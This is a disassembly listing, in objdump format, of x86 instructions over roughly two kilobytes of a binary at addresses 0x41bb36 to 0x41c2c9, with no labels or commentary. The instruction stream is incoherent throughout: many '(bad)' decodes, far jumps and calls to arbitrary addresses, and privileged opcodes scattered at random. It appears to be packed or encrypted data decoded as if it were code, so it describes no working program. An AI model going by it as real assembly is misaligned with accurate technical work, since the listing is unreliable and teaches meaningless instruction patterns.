  41bb36:	out    0x7a,al
  41bb38:	jo     0x41bba7
  41bb3a:	pop    ss
  41bb3b:	mov    dl,0x11
  41bb3d:	sbb    DWORD PTR [eax-0x24],ecx
  41bb40:	bound  edx,QWORD PTR [esi]
  41bb42:	clc    
  41bb43:	mov    ds:0xaae56479,eax
  41bb48:	sbb    DWORD PTR [edi+0x65],0x4182ebb9
  41bb4f:	out    dx,al
  41bb50:	push   ebx
  41bb51:	inc    ebx
  41bb52:	repnz fst QWORD PTR [ecx-0x79]
  41bb56:	out    dx,al
  41bb57:	addr16 enter 0xe78e,0xf4
  41bb5c:	mov    al,0x78
  41bb5e:	test   DWORD PTR [eax-0x1eef3650],0xaa1a3651
  41bb68:	fild   DWORD PTR [ebx]
  41bb6a:	bound  ebx,QWORD PTR [edi-0x38ea7989]
  41bb70:	call   DWORD PTR [ebx]
  41bb72:	sbb    al,BYTE PTR [ecx+0x66]
  41bb75:	xchg   edx,eax
  41bb76:	or     cl,BYTE PTR [esi+0x70]
  41bb79:	push   eax
  41bb7a:	or     DWORD PTR [ebp-0x472fe46f],0x6a
  41bb81:	int3   
  41bb82:	xor    edx,DWORD PTR [ebp+0xab3b0b3]
  41bb88:	aad    0xd4
  41bb8a:	inc    edi
  41bb8b:	loope  0x41bbf3
  41bb8d:	stc    
  41bb8e:	pop    ss
  41bb8f:	dec    edi
  41bb90:	dec    edx
  41bb91:	bound  esi,QWORD PTR [eax+0x54]
  41bb94:	or     DWORD PTR [edi+0x95ef45e],eax
  41bb9a:	bound  ebp,QWORD PTR [eax+0x3962ed84]
  41bba0:	mov    bh,BYTE PTR [ebp+0x5c301d98]
  41bba6:	(bad)  [esi-0x18ef03ed]
  41bbac:	ins    BYTE PTR es:[edi],dx
  41bbad:	setle  bh
  41bbb0:	push   ss
  41bbb1:	shr    DWORD PTR [eax+0x62],0x29
  41bbb5:	je     0x41bbdd
  41bbb7:	jl     0x41bb96
  41bbb9:	test   DWORD PTR [ebx+0x5585eb9c],0xdcc3ac8d
  41bbc3:	sub    edx,esp
  41bbc5:	xor    eax,0x1e46897
  41bbca:	fistp  DWORD PTR [ebp+0x27a575c0]
  41bbd0:	and    DWORD PTR [esi],edx
  41bbd2:	push   ebp
  41bbd3:	test   edi,esp
  41bbd5:	arpl   WORD PTR [edi-0x4661808],si
  41bbdb:	(bad)
  41bbdf:	scas   al,BYTE PTR es:[edi]
  41bbe0:	xor    esp,DWORD PTR [ebx+0x43]
  41bbe3:	push   0xe0b2fff7
  41bbe8:	push   edi
  41bbe9:	jmp    0xb9721cef
  41bbee:	ret    
  41bbef:	out    0xe8,al
  41bbf1:	jge    0x41bbda
  41bbf3:	push   cs
  41bbf4:	sub    bl,BYTE PTR [esi-0x75]
  41bbf7:	add    dl,BYTE PTR [ecx-0x5f]
  41bbfa:	mov    ebx,0x8dec5d52
  41bbff:	sbb    cl,BYTE PTR [eax+eiz*8+0x11]
  41bc03:	xchg   ebp,eax
  41bc04:	pop    es
  41bc05:	inc    eax
  41bc06:	push   es
  41bc07:	nop
  41bc08:	out    0x91,al
  41bc0a:	fcomp  QWORD PTR [eax+0x44]
  41bc0d:	sbb    al,0xd7
  41bc0f:	call   FWORD PTR [edx]
  41bc11:	adc    eax,0xb3fb6712
  41bc16:	sub    bh,BYTE PTR [esi]
  41bc18:	call   0x40c11103
  41bc1d:	jnp    0x41bbef
  41bc1f:	dec    BYTE PTR [ecx+0x539f2dee]
  41bc25:	sbb    DWORD PTR [ebx-0x18],ebx
  41bc28:	or     DWORD PTR [ebx-0x1ff29506],ebp
  41bc2e:	jmp    0x8116852
  41bc33:	inc    ecx
  41bc34:	mov    DWORD PTR [ecx],0xb4b0da49
  41bc3a:	ficomp WORD PTR ds:0x91837521
  41bc40:	stos   BYTE PTR es:[edi],al
  41bc41:	int    0x2d
  41bc43:	addr16 pop es
  41bc45:	adc    esp,esp
  41bc47:	popa   
  41bc48:	retf   0xd4c9
  41bc4b:	sub    DWORD PTR [eax-0x3c015690],esp
  41bc51:	push   edi
  41bc52:	push   esi
  41bc53:	mov    al,ds:0xfba4671c
  41bc58:	push   edi
  41bc59:	adc    ecx,DWORD PTR [edx]
  41bc5b:	jns    0x41bbfa
  41bc5d:	les    ebp,FWORD PTR [edi*1+0x5d689332]
  41bc64:	add    eax,0xf8f8c8f3
  41bc69:	test   al,0x73
  41bc6b:	call   0xa08a:0x39f1fa4c
  41bc72:	or     esi,ebx
  41bc74:	or     ecx,ebp
  41bc76:	push   es
  41bc77:	inc    edx
  41bc78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc79:	scas   eax,DWORD PTR es:[edi]
  41bc7a:	mov    cl,ah
  41bc7c:	inc    esi
  41bc7d:	sti    
  41bc7e:	or     al,0xda
  41bc80:	rcr    DWORD PTR [edx+eax*1-0x47],cl
  41bc84:	js     0x41bc13
  41bc86:	sub    BYTE PTR [ebx+0x6f],0x14
  41bc8a:	aas    
  41bc8b:	sbb    eax,0x4e536945
  41bc90:	jo     0x41bc82
  41bc92:	inc    ecx
  41bc93:	xchg   edx,eax
  41bc94:	xchg   edi,eax
  41bc95:	dec    ebx
  41bc96:	shr    DWORD PTR [esi-0x2f],1
  41bc99:	adc    DWORD PTR [eax],ecx
  41bc9b:	mov    ds:0xea4c5d8b,eax
  41bca0:	inc    DWORD PTR [edi]
  41bca2:	and    dl,BYTE PTR [ebx+0x13]
  41bca5:	and    BYTE PTR [esi+0x793f9964],0x43
  41bcac:	or     al,0x54
  41bcae:	push   ss
  41bcaf:	mov    edx,0xb08b51b6
  41bcb4:	mov    ds:0xf3088f3e,al
  41bcb9:	scas   eax,DWORD PTR es:[edi]
  41bcba:	mov    BYTE PTR [ebx],bh
  41bcbc:	enter  0xf6ab,0x14
  41bcc0:	add    bh,cl
  41bcc2:	jnp    0x41bc7f
  41bcc4:	mov    dh,0x9
  41bcc6:	es xchg esi,eax
  41bcc8:	jmp    0xdc49:0xed6d22ed
  41bccf:	out    dx,al
  41bcd0:	sbb    dh,ch
  41bcd2:	xchg   edi,eax
  41bcd3:	jecxz  0x41bcc0
  41bcd5:	inc    ebp
  41bcd6:	xor    esp,eax
  41bcd8:	mov    bl,0xc7
  41bcda:	cmp    esp,ebx
  41bcdc:	imul   edx,DWORD PTR [ebp-0x56],0x76
  41bce0:	mov    dl,0xf3
  41bce2:	fs scas eax,DWORD PTR es:[edi]
  41bce4:	jo     0x41bd2d
  41bce6:	dec    esp
  41bce7:	add    ebp,esp
  41bce9:	lods   eax,DWORD PTR ds:[esi]
  41bcea:	jecxz  0x41bcee
  41bcec:	xchg   DWORD PTR ds:0x402c8fee,esi
  41bcf2:	lods   eax,DWORD PTR ds:[esi]
  41bcf3:	jg     0x41bd56
  41bcf5:	arpl   WORD PTR [ebx-0x74c49d96],bp
  41bcfb:	test   eax,0xfb05511f
  41bd00:	mov    bl,BYTE PTR [edi+eiz*2-0x10c79657]
  41bd07:	jmp    0x386a:0xf20f79eb
  41bd0e:	mov    WORD PTR [edx-0x22],gs
  41bd11:	cdq    
  41bd12:	sti    
  41bd13:	cli    
  41bd14:	push   eax
  41bd15:	je     0x41bd3c
  41bd17:	lds    edi,FWORD PTR [eax]
  41bd19:	push   0x22
  41bd1b:	add    ecx,DWORD PTR [ecx-0x733c74c6]
  41bd21:	xchg   ebp,eax
  41bd22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd23:	bound  ebp,QWORD PTR [eax]
  41bd25:	mov    dh,BYTE PTR [edx+0x768c70ba]
  41bd2b:	mov    ds:0x46ac4166,al
  41bd30:	stos   BYTE PTR es:[edi],al
  41bd31:	mov    bl,0x3f
  41bd33:	mov    ebp,0xc9b745b3
  41bd38:	in     eax,dx
  41bd39:	in     eax,dx
  41bd3a:	jo     0x41bcd4
  41bd3c:	push   0xffffffc1
  41bd3e:	(bad)  
  41bd3f:	mov    esp,0x15e8b782
  41bd44:	push   ss
  41bd45:	inc    edx
  41bd46:	stos   BYTE PTR es:[edi],al
  41bd47:	mov    esi,0xd4b132d6
  41bd4c:	mov    cl,0xdf
  41bd4e:	mov    ah,dh
  41bd50:	pop    eax
  41bd51:	xchg   ecx,eax
  41bd52:	rcl    BYTE PTR [edx+0x64cb7786],cl
  41bd58:	(bad)  
  41bd5a:	xor    edi,edx
  41bd5c:	mov    BYTE PTR [esi],ch
  41bd5e:	imul   eax,ebx,0xffffffea
  41bd61:	adc    BYTE PTR [ebx],dl
  41bd63:	mov    bh,0x71
  41bd65:	push   edx
  41bd66:	lods   al,BYTE PTR ds:[esi]
  41bd67:	retf   
  41bd68:	(bad)  
  41bd69:	clc    
  41bd6a:	and    bl,BYTE PTR [ebp+0x7d]
  41bd6d:	iret   
  41bd6e:	das    
  41bd6f:	sbb    al,0xb3
  41bd71:	inc    edi
  41bd72:	xor    al,0xb3
  41bd74:	inc    esp
  41bd75:	cmp    BYTE PTR [ebx-0x36],cl
  41bd78:	sub    al,0xd4
  41bd7a:	inc    edx
  41bd7b:	fld    TBYTE PTR [edx-0x3c]
  41bd7e:	(bad)  
  41bd7f:	std    
  41bd80:	jmp    0x4503:0x2fbb7a72
  41bd87:	cmp    dl,ah
  41bd89:	sub    DWORD PTR [ebp+0x4e],esp
  41bd8c:	xchg   edi,eax
  41bd8d:	jge    0x41bd30
  41bd8f:	pushf  
  41bd90:	pop    eax
  41bd91:	aad    0xb5
  41bd93:	sar    ebp,cl
  41bd95:	push   ebx
  41bd96:	jmp    0x41bda6
  41bd98:	xchg   edx,eax
  41bd99:	inc    BYTE PTR [edi+0x7f68470d]
  41bd9f:	pushf  
  41bda0:	dec    ecx
  41bda1:	les    edi,FWORD PTR [eax-0x7960705c]
  41bda7:	rcr    BYTE PTR [edi-0x63],cl
  41bdaa:	out    dx,eax
  41bdab:	nop
  41bdac:	and    al,0x5d
  41bdae:	ret    
  41bdaf:	mov    dl,BYTE PTR [eax+ebx*8+0x7d]
  41bdb3:	inc    esp
  41bdb4:	imul   ebx,DWORD PTR [edi],0x4f
  41bdb7:	fcom   st(4)
  41bdb9:	icebp  
  41bdba:	imul   esp
  41bdbc:	adc    BYTE PTR [ecx-0xc],cl
  41bdbf:	mov    ch,0xed
  41bdc1:	pop    ebx
  41bdc2:	outs   dx,BYTE PTR ds:[esi]
  41bdc3:	pop    edx
  41bdc4:	cmp    DWORD PTR [edx-0x316c7929],esi
  41bdca:	push   esi
  41bdcb:	fs std 
  41bdcd:	dec    ebp
  41bdce:	xor    ebx,esp
  41bdd0:	jmp    0xd64d:0xf38b73f5
  41bdd7:	pop    es
  41bdd8:	push   0xcbd598f4
  41bddd:	ja     0x41bdb7
  41bddf:	or     al,0x14
  41bde1:	test   eax,0x3f6bcd6e
  41bde6:	xchg   esi,eax
  41bde7:	imul   BYTE PTR [ecx-0x18f2b991]
  41bded:	pop    esi
  41bdee:	data16 xlat BYTE PTR ds:[ebx]
  41bdf0:	out    0x16,al
  41bdf2:	pusha  
  41bdf3:	mov    ecx,0x34aae428
  41bdf8:	jmp    0x322a:0x8f02544
  41bdff:	xor    eax,0xdb3bee36
  41be04:	pop    DWORD PTR [esi+eax*4+0x2c]
  41be08:	arpl   sp,bp
  41be0a:	mov    al,ds:0xaad9ecb0
  41be0f:	lock xchg ebx,eax
  41be11:	jmp    0x41be3c
  41be13:	inc    eax
  41be14:	sbb    eax,0x73cd8351
  41be19:	push   ebp
  41be1a:	ror    DWORD PTR [ecx+0x2ae090d0],0xaf
  41be21:	jns    0x41be84
  41be23:	mov    DWORD PTR [esi],0xa2878351
  41be29:	lds    edi,FWORD PTR [ecx+0x3d]
  41be2c:	rcr    BYTE PTR [esi-0x68],0x80
  41be30:	pusha  
  41be31:	into   
  41be32:	repnz mov ds:0xb6192ac7,al
  41be38:	test   al,0xe2
  41be3a:	or     bh,BYTE PTR [edx]
  41be3c:	dec    edi
  41be3d:	ss clc 
  41be3f:	jno    0x41be4a
  41be41:	push   0x2a
  41be43:	xchg   BYTE PTR [edx],ah
  41be45:	push   0xffffff88
  41be47:	(bad)  
  41be48:	sbb    ecx,ebx
  41be4a:	xchg   esi,eax
  41be4b:	jnp    0x41beb4
  41be4d:	sbb    eax,0x512952e3
  41be52:	add    DWORD PTR [eax-0x58],eax
  41be55:	pcmpgtd mm7,QWORD PTR [edi-0x6af3e062]
  41be5c:	test   DWORD PTR [esi+edx*1+0x5615fe60],0x8d589e81
  41be67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be68:	inc    esp
  41be69:	loop   0x41be22
  41be6b:	xchg   DWORD PTR [ebp-0x60],esi
  41be6e:	inc    eax
  41be6f:	call   0xa94e95e0
  41be74:	das    
  41be75:	xchg   BYTE PTR [eax-0x6af6b3fe],bl
  41be7b:	xchg   esi,eax
  41be7c:	jmp    0x41beba
  41be7e:	jp     0x41be16
  41be80:	in     eax,0x82
  41be82:	bound  edx,QWORD PTR [ebp+0x41686649]
  41be88:	xor    bl,dl
  41be8a:	retf   0x6374
  41be8d:	ins    DWORD PTR es:[edi],dx
  41be8e:	in     al,0x40
  41be90:	ins    DWORD PTR es:[edi],dx
  41be91:	adc    al,0x77
  41be93:	xor    al,0xeb
  41be95:	aaa    
  41be96:	cld    
  41be97:	mov    ebp,0xb0a40dcd
  41be9c:	iret   
  41be9d:	inc    ebp
  41be9e:	and    al,0xfe
  41bea0:	mov    ds:0xa85265cc,al
  41bea5:	xchg   esi,eax
  41bea6:	daa    
  41bea7:	jmp    0x29aa363e
  41beac:	stc    
  41bead:	inc    eax
  41beae:	push   edx
  41beaf:	rol    BYTE PTR [edx-0x5f],0x70
  41beb3:	jl     0x41beea
  41beb5:	cmp    DWORD PTR [ebp+edi*2-0x767ff0d6],ebp
  41bebc:	jle    0x41bf1e
  41bebe:	sahf   
  41bebf:	and    al,0x65
  41bec1:	popf   
  41bec2:	mov    esp,0xfdb6c7a4
  41bec7:	pop    ecx
  41bec8:	sub    dl,dl
  41beca:	mov    esi,0x47dd01ae
  41becf:	cmp    BYTE PTR [esi+0x48d961e4],bh
  41bed5:	pusha  
  41bed6:	scas   al,BYTE PTR es:[edi]
  41bed7:	sbb    DWORD PTR [ebx],esp
  41bed9:	mov    ah,0xab
  41bedb:	cwde   
  41bedc:	mov    ds:0xb6fc9715,al
  41bee1:	or     al,0x3e
  41bee3:	mov    ch,0x22
  41bee5:	mov    edi,0x1fb3a9bd
  41beea:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beec:	popw   ds
  41beee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beef:	lahf   
  41bef0:	(bad)  [ebp+0x76539c60]
  41bef6:	mov    WORD PTR [ebp-0x5fee307b],?
  41befc:	jge    0x41bf69
  41befe:	test   al,0xaf
  41bf00:	(bad)  
  41bf02:	push   ecx
  41bf03:	adc    eax,DWORD PTR [edx]
  41bf05:	mov    cl,0xd1
  41bf07:	iret   
  41bf08:	mov    bh,bh
  41bf0a:	sbb    esp,DWORD PTR [bp+si]
  41bf0d:	cmp    esi,DWORD PTR [ebp+0x4e726ad8]
  41bf13:	inc    ebp
  41bf14:	adc    DWORD PTR [ebp-0x4],esi
  41bf17:	cmc    
  41bf18:	pusha  
  41bf19:	loope  0x41bf15
  41bf1b:	pop    edi
  41bf1c:	int3   
  41bf1d:	(bad)  
  41bf1e:	(bad)  
  41bf1f:	icebp  
  41bf20:	iret   
  41bf21:	add    edx,esp
  41bf23:	push   esp
  41bf24:	or     DWORD PTR [ebx],esp
  41bf26:	(bad)  
  41bf27:	cmp    DWORD PTR [edx+0x32],esi
  41bf2a:	or     BYTE PTR [eax-0x196e2c6c],0x41
  41bf31:	mov    BYTE PTR [ebp-0x5],cl
  41bf34:	mov    al,0x35
  41bf36:	dec    ebx
  41bf37:	std    
  41bf38:	xchg   ecx,eax
  41bf39:	sbb    DWORD PTR [edi-0x5d],0xd150aba7
  41bf40:	dec    ecx
  41bf41:	aas    
  41bf42:	add    DWORD PTR ds:0x8ef84663,edi
  41bf48:	ror    DWORD PTR [esp+ecx*8-0x5e1a56d],1
  41bf4f:	test   eax,ecx
  41bf51:	ror    DWORD PTR [edx],cl
  41bf53:	aam    0xc6
  41bf55:	push   0xcfb7ba8b
  41bf5a:	sbb    al,0x42
  41bf5c:	outs   dx,BYTE PTR ds:[esi]
  41bf5d:	xchg   ecx,eax
  41bf5e:	fdivr  QWORD PTR [eax]
  41bf60:	sbb    BYTE PTR [esp+ebx*4],al
  41bf63:	sahf   
  41bf64:	ins    BYTE PTR es:[edi],dx
  41bf65:	lods   eax,DWORD PTR ds:[esi]
  41bf66:	mov    esp,0x769f477a
  41bf6b:	jl     0x41bfdc
  41bf6d:	cwde   
  41bf6e:	loopne 0x41bf51
  41bf70:	sti    
  41bf71:	mov    ds:0x16b16556,eax
  41bf76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf77:	fiadd  DWORD PTR [ecx+0x46]
  41bf7a:	push   ds
  41bf7b:	inc    edi
  41bf7c:	aad    0x96
  41bf7e:	lods   eax,DWORD PTR ds:[esi]
  41bf7f:	ret    0x9e
  41bf82:	cwde   
  41bf83:	pop    ss
  41bf84:	iret   
  41bf85:	sub    eax,esp
  41bf87:	in     eax,0x34
  41bf89:	or     BYTE PTR [ebx+0xa],dh
  41bf8c:	bound  ecx,QWORD PTR [eax]
  41bf8e:	mov    al,0xc9
  41bf90:	mov    WORD PTR [eax+0x5f66a134],gs
  41bf96:	pop    esi
  41bf97:	push   ecx
  41bf98:	in     al,0x64
  41bf9a:	push   ds
  41bf9b:	lods   eax,DWORD PTR ds:[esi]
  41bf9c:	mov    dl,0xe4
  41bf9e:	mov    ebp,DWORD PTR [esi-0x3d894e98]
  41bfa4:	cmp    eax,0x8f2f8b03
  41bfa9:	pop    ss
  41bfaa:	xor    DWORD PTR [ecx+0x3a],edx
  41bfad:	das    
  41bfae:	push   edx
  41bfaf:	int    0xd6
  41bfb1:	imul   edx,DWORD PTR [edi+0x23],0xa
  41bfb5:	lahf   
  41bfb6:	(bad)  
  41bfb8:	jecxz  0x41bfb6
  41bfba:	popa   
  41bfbb:	popf   
  41bfbc:	or     edi,DWORD PTR [eax+0x6e]
  41bfbf:	mov    dh,0xb6
  41bfc1:	out    dx,al
  41bfc2:	popa   
  41bfc3:	cmp    eax,DWORD PTR [esi+0x3]
  41bfc6:	jo     0x41bfaa
  41bfc8:	repnz test DWORD PTR [edi-0x5e],ebp
  41bfcc:	push   0x57
  41bfce:	sub    al,0x97
  41bfd1:	ds gs (bad) 
  41bfd4:	stos   DWORD PTR es:[edi],eax
  41bfd5:	cmp    ecx,ebx
  41bfd7:	out    0xe9,al
  41bfd9:	mov    BYTE PTR [esp+eiz*4+0x15],ah
  41bfdd:	push   eax
  41bfde:	into   
  41bfdf:	out    dx,al
  41bfe0:	mov    dh,0xe8
  41bfe2:	addr16 dec eax
  41bfe4:	mov    bh,0x6b
  41bfe6:	cld    
  41bfe7:	mov    dh,0xc
  41bfe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bfea:	gs into 
  41bfec:	lock xchg eax,ebx
  41bfef:	push   ss
  41bff0:	into   
  41bff1:	ret    0xd781
  41bff4:	dec    edx
  41bff5:	shr    edi,cl
  41bff7:	mov    esp,0xa97d77f7
  41bffc:	push   ebx
  41bffd:	pop    es
  41bffe:	(bad)  
  41bfff:	iret   
  41c000:	mov    WORD PTR [ebx+edx*2-0x3d88ec45],cs
  41c007:	adc    edx,DWORD PTR [ebx+0x41e4f5c8]
  41c00d:	jg     0x41bfe3
  41c00f:	sbb    BYTE PTR [edx-0x4f],0x8c
  41c013:	jecxz  0x41c062
  41c015:	retf   0xb72a
  41c018:	lea    ebx,[eax-0xc7a9b1]
  41c01e:	arpl   WORD PTR [esi+0x1c],cx
  41c021:	sbb    BYTE PTR [ecx-0x48fced43],dl
  41c027:	fsubrp st(4),st
  41c029:	loope  0x41c097
  41c02b:	cwde   
  41c02c:	stos   BYTE PTR es:[edi],al
  41c02d:	clc    
  41c02e:	push   esi
  41c02f:	mov    dh,0x19
  41c031:	cdq    
  41c032:	repz mov bh,0x2
  41c035:	mov    edx,0xf59067e7
  41c03a:	xchg   esi,eax
  41c03b:	sbb    eax,0x3e900359
  41c040:	jno    0x41c090
  41c042:	(bad)  
  41c043:	dec    edi
  41c044:	popf   
  41c045:	clc    
  41c046:	mov    esp,ebp
  41c048:	mov    esi,0x69deebc4
  41c04d:	xchg   ebx,eax
  41c04e:	or     ah,ch
  41c050:	inc    ebp
  41c051:	mov    eax,0xd97f63e8
  41c056:	test   BYTE PTR fs:[ebx+0x16bdeb9a],dh
  41c05d:	(bad)  
  41c05e:	fst    QWORD PTR [eax+0xa648dd2]
  41c064:	inc    ecx
  41c065:	js     0x41c0b0
  41c067:	test   BYTE PTR [eax+0x7f],bh
  41c06a:	jo     0x41c01c
  41c06c:	push   ebp
  41c06d:	je     0x41bff9
  41c06f:	push   es
  41c070:	ss mov ebp,0xc54511ab
  41c076:	mov    ds:0x6fe22f2,al
  41c07b:	cwde   
  41c07c:	or     eax,0xf727cc4e
  41c081:	loop   0x41c03e
  41c083:	in     eax,dx
  41c084:	sub    al,0x5a
  41c086:	pusha  
  41c087:	sahf   
  41c088:	and    al,ah
  41c08a:	ret    
  41c08b:	inc    BYTE PTR [ecx+0x31dcbe19]
  41c091:	aas    
  41c092:	stc    
  41c093:	je     0x41c08f
  41c095:	and    eax,0x7fb3b8cd
  41c09a:	mov    cl,0x9a
  41c09c:	in     eax,0x5
  41c09e:	(bad)  
  41c09f:	pushf  
  41c0a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0a1:	lods   eax,DWORD PTR ds:[esi]
  41c0a2:	icebp  
  41c0a3:	rol    BYTE PTR [ecx-0x37badf6b],1
  41c0a9:	gs and ebx,edi
  41c0ac:	dec    edx
  41c0ad:	jne    0x41c063
  41c0af:	int3   
  41c0b0:	mov    al,0x3f
  41c0b2:	in     eax,dx
  41c0b3:	data16 mov cl,0x1d
  41c0b6:	fwait
  41c0b7:	add    eax,0xbd7b2cd8
  41c0bc:	cmc    
  41c0bd:	xchg   ecx,eax
  41c0be:	aad    0xe7
  41c0c0:	rcl    BYTE PTR [edi-0x117e1689],1
  41c0c6:	add    DWORD PTR [edx+edi*8+0x65a12292],0x6bc38b4b
  41c0d1:	lahf   
  41c0d2:	add    ebp,edx
  41c0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c0d5:	add    eax,0xacd28297
  41c0da:	jmp    0xd856:0x6c043b3
  41c0e1:	call   0x4618:0x67a34306
  41c0e8:	(bad)  
  41c0ea:	int    0x9b
  41c0ec:	jae    0x41c0f3
  41c0ee:	xchg   esp,eax
  41c0ef:	jmp    0x41c0fa
  41c0f1:	sahf   
  41c0f2:	jno    0x41c07b
  41c0f4:	or     eax,0xf46768c8
  41c0f9:	cld    
  41c0fa:	mov    cl,0x12
  41c0fc:	addr16 dec esp
  41c0fe:	repnz cwde 
  41c100:	mov    ecx,0x73da7ad7
  41c105:	inc    edi
  41c106:	pop    ds
  41c107:	xor    dl,BYTE PTR [ecx-0x3568b860]
  41c10d:	fsubr  QWORD PTR [edi+0x16]
  41c110:	lock jno 0x41c150
  41c113:	and    DWORD PTR [edi+0x67],edi
  41c116:	xchg   ecx,eax
  41c117:	fidiv  WORD PTR [eax+0x6e]
  41c11a:	jp     0x41c0f1
  41c11c:	or     ah,BYTE PTR [edx-0x16]
  41c11f:	jecxz  0x41c133
  41c121:	outs   dx,BYTE PTR ds:[esi]
  41c122:	inc    edi
  41c123:	data16 or ah,BYTE PTR [eax+0x3b90dbef]
  41c12a:	xchg   edi,eax
  41c12b:	mov    ebp,0x37894829
  41c130:	cwde   
  41c131:	sub    BYTE PTR [ebx],dh
  41c133:	int3   
  41c134:	rol    DWORD PTR ds:0x3daced99,1
  41c13a:	jp     0x41c0be
  41c13c:	or     DWORD PTR [edi+edx*4-0xa],eax
  41c140:	fisubr WORD PTR [ebp+0x3b5294a0]
  41c146:	jle    0x41c125
  41c148:	mov    esp,0x73e57670
  41c14d:	sahf   
  41c14e:	shl    DWORD PTR [ecx+0x5e],1
  41c151:	inc    ebp
  41c152:	xchg   esi,eax
  41c153:	lahf   
  41c154:	rol    BYTE PTR [edi],0x84
  41c157:	in     al,dx
  41c158:	mov    ebx,0x7fd3b6b7
  41c15d:	cmp    DWORD PTR [edi+0x4baee36f],edx
  41c163:	sti    
  41c164:	test   eax,0x4cfad44e
  41c169:	std    
  41c16a:	imul   ecx,ebp,0xffffffea
  41c16d:	bound  ebp,QWORD PTR [edx+0x62bf030c]
  41c173:	xchg   edi,edi
  41c175:	scas   al,BYTE PTR es:[edi]
  41c176:	mov    WORD PTR [edx],?
  41c178:	jbe    0x41c18b
  41c17a:	retf   
  41c17b:	test   BYTE PTR ds:0xb17ed8aa,bh
  41c181:	scas   al,BYTE PTR es:[edi]
  41c182:	mov    esp,0x9c47cfe7
  41c187:	add    DWORD PTR [edi+esi*4+0x1c5b59a],esp
  41c18e:	inc    eax
  41c18f:	jle    0x41c182
  41c191:	push   0xae51602e
  41c196:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c197:	in     eax,0x98
  41c199:	sbb    DWORD PTR [edi-0x5020cc44],edx
  41c19f:	std    
  41c1a0:	pop    ebp
  41c1a1:	ins    DWORD PTR es:[edi],dx
  41c1a2:	out    dx,eax
  41c1a3:	les    edi,FWORD PTR [ebx-0x7e]
  41c1a6:	aam    0xfd
  41c1a8:	shr    DWORD PTR [eax+ecx*4+0x74c2eabd],cl
  41c1af:	(bad)  
  41c1b0:	into   
  41c1b1:	ror    BYTE PTR [edx+0x535866df],1
  41c1b7:	out    dx,al
  41c1b8:	inc    edx
  41c1b9:	fiadd  WORD PTR [esi-0x37ad98ab]
  41c1bf:	clc    
  41c1c0:	fcomp  QWORD PTR [esi+0x7]
  41c1c3:	push   edi
  41c1c4:	mov    esi,0x24e23101
  41c1c9:	retf   0xa4ba
  41c1cc:	mov    ebp,0x783fda58
  41c1d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1d2:	(bad)  
  41c1d3:	mov    ecx,0xe795f20d
  41c1d8:	mov    ah,0xc
  41c1da:	daa    
  41c1db:	mov    ah,0x77
  41c1dd:	mov    edi,esi
  41c1df:	loope  0x41c197
  41c1e1:	ja     0x41c245
  41c1e3:	mov    ebp,0xa9655a76
  41c1e8:	add    eax,0xb526d81
  41c1ed:	pop    ecx
  41c1ee:	push   ss
  41c1ef:	arpl   WORD PTR [edi],si
  41c1f1:	sti    
  41c1f2:	fnsave [eax+0x31]
  41c1f5:	push   edx
  41c1f6:	mov    dl,0xc7
  41c1f8:	xchg   ebp,eax
  41c1f9:	mov    cl,0x26
  41c1fb:	sbb    eax,0x883fd96f
  41c200:	xor    edx,DWORD PTR [esi-0x7a498832]
  41c206:	clc    
  41c207:	(bad)  
  41c209:	inc    edi
  41c20a:	push   edi
  41c20b:	gs jmp 0x2d99:0xac8528e8
  41c213:	lds    edi,FWORD PTR [ecx+eiz*8]
  41c216:	adc    al,0x7f
  41c218:	pusha  
  41c219:	lods   al,BYTE PTR ds:[esi]
  41c21a:	fnstcw WORD PTR es:[ecx+0x67]
  41c21e:	imul   ebx,DWORD PTR [esi],0xa366d3cc
  41c224:	shr    bl,1
  41c226:	(bad)  
  41c227:	loopne 0x41c27c
  41c229:	retf   0x302b
  41c22c:	jae    0x41c261
  41c22e:	sub    al,0xd7
  41c230:	add    eax,0x8a8febb9
  41c235:	stos   DWORD PTR es:[edi],eax
  41c236:	retf   
  41c237:	in     al,0xf4
  41c239:	loopne 0x41c1e1
  41c23b:	dec    edx
  41c23c:	out    0xcf,al
  41c23e:	add    DWORD PTR [esi+0x2a3068b5],esp
  41c244:	test   BYTE PTR [edx],bh
  41c246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c247:	xchg   BYTE PTR [eax-0x53],cl
  41c24a:	fs jbe 0x41c24e
  41c24d:	std    
  41c24e:	mov    bl,0xe3
  41c250:	push   esi
  41c251:	sbb    BYTE PTR [esi+0x4bc67ef0],ah
  41c257:	push   ecx
  41c258:	int3   
  41c259:	jp     0x41c1db
  41c25b:	cwde   
  41c25c:	retf   
  41c25d:	imul   edx,ecx,0xd9a379b9
  41c263:	mov    esp,0x20d71f36
  41c268:	fld    QWORD PTR [esi-0x651f8aef]
  41c26e:	sub    al,0x69
  41c270:	mov    al,ds:0x7ee25ede
  41c275:	icebp  
  41c276:	(bad)  
  41c277:	fld    TBYTE PTR [eax+0x56a123f9]
  41c27d:	add    ebp,DWORD PTR [eax-0x4c4ffa5a]
  41c283:	inc    esp
  41c284:	jb     0x41c294
  41c286:	retf   0xebe2
  41c289:	xchg   edi,eax
  41c28a:	enter  0xd30e,0x52
  41c28e:	retf   0xee0b
  41c291:	xchg   esp,eax
  41c292:	arpl   bp,sp
  41c294:	loope  0x41c2ad
  41c296:	add    dl,0x88
  41c299:	out    dx,al
  41c29a:	jae    0x41c2f8
  41c29c:	or     eax,0x5db60107
  41c2a1:	(bad)  
  41c2a2:	stc    
  41c2a3:	aam    0x7e
  41c2a5:	addr16 (bad) 
  41c2a8:	adc    ebx,DWORD PTR [edi+0x5f07ad66]
  41c2ae:	push   0x11e18712
  41c2b3:	out    0xc9,al
  41c2b5:	sti    
  41c2b6:	mov    ss,WORD PTR [edx+0x461797b4]
  41c2bc:	int3   
  41c2bd:	(bad)
  41c2c0:	in     al,0xf0
  41c2c2:	shl    BYTE PTR [esi-0xf282a46],1
  41c2c8:	xchg   ebp,eax
  41c2c9:	and    eax,0x9878a079
